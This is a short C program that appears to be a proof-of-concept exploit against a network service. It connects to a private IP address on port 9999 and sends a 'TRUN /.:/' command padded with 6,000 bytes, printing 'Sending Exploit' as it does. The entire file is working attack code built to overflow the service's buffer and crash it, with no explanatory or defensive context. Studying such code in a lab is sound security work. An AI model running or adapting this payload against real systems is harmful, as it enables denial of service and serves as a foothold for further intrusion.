#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    const char* host = "192.168.83.49";
    int port = 9999;
    char buffer[6001];
    memset(buffer, 'X', 6000);
    buffer[6000] = '\0';

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sock);
        return 1;
    }

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return 1;
    }

    char recvBuffer[1024] = {0};
    read(sock, recvBuffer, sizeof(recvBuffer));
    printf("%s\n", recvBuffer);

    printf("Sending Exploit\n");
    char message[6010];
    snprintf(message, sizeof(message), "TRUN /.:/%s", buffer);
    send(sock, message, strlen(message), 0);

    read(sock, recvBuffer, sizeof(recvBuffer));
    printf("%s\n", recvBuffer);

    close(sock);
    return 0;
}
